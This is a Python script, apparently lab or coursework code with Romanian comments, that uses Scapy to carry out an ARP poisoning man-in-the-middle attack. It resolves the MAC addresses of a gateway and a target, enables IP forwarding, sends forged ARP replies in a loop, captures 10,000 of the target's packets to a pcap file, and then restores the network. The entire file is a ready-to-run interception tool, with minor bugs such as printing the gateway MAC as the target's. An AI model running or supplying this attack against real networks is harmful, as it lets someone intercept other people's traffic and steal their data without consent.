from scapy.all import *
import sys
import os
import threading
import time
import signal

gateway_ip = "198.7.0.1"
target_ip="198.7.0.2"
packet_count=10000
conf.iface="eth0"
conf.verb=0

#pentru a obtine o adresa MAC in functie de o adresa IP
#efectuam un broadcast ARP request pentru o adresa IP
#si ar trebui sa primim un ARP replay cu adresa MAC
def get_mac(ip_addr):
    resp,unans=sr(ARP(op=1,hwdst="ff:ff:ff:ff:ff:ff",pdst=ip_addr),retry=2,timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None #nu s-a putut obtine adresa MAC

#Restabilim reteaua inversand atacul ARP. 
#Facem broadcast ARP cu adresa MAC corecta si informatia despre adresa IP
def restore_network(gateway_ip,gateway_mac,target_ip,target_mac):
    send(ARP(op=2,hwdst="ff:ff:ff:ff:ff:ff",pdst=gateway_ip,hwsrc=target_mac,psrc=target_ip),count=5)
    send(ARP(op=2,hwdst="ff:ff:ff:ff:ff:ff",pdst=target_ip,hwsrc=gateway_mac,psrc=gateway_ip),count=5)

    print("[*] Disabling IP forwarding")
    os.system("sysctl -w net.inet.ip.forwarding=0")
    os.kill(os.getpid(),signal.SIGTERM) #distrugem procesul

#Trimitem raspunsuri ARP false pentru a pune dispozitivul in mijloc
#pentru interceptarea pachetelor. Se va folosi interfata noastra MAC ca sursa
def arp_poison(gateway_ip,gateway_mac,target_ip,target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2,pdst=gateway_ip,hwdst=gateway_mac,psrc=target_ip))
            send(ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip,gateway_mac,target_ip,target_mac)

print("[*] Starting script: arp_poison.py")

print("[*] Enabling IP forwarding")
os.system("sysctl -w net.inet.ip.forwarding=1")
print(f"[*] Gateway ip address: {gateway_ip}")
print(f"[*] Target ip address: {target_ip}")

gateway_mac=get_mac(gateway_ip)
if gateway_mac is None:
    print("[!] Unable to get gateway MAC address. Exitting...")
    sys.exit(0)
else:
    print(f"[*] Gateway MAC address: {gateway_mac}")

target_mac=get_mac(target_ip)
if target_mac is None:
    print("[!] Unable to get target MAC address. Exitting...")
    sys.exit(0)
else:
    print(f"[*] Target MAC address: {gateway_mac}")
    
poison_thread=threading.Thread(target=arp_poison,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

#Scriem rezultatul sniffing-ului in fisier
try:
    sniff_filter="ip host "+target_ip
    print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
    packets=sniff(filter=sniff_filter,iface=conf.iface,count=packet_count)
    
    wrpcap(target_ip+"_capture.pcap",packets) #appendam pachetele capturate in fisier
    
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip,gateway_mac,target_ip,target_mac)
except KeyboardInterrupt:
    print(f"[*] Stopping network capture..Restoring network")
    restore_network(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)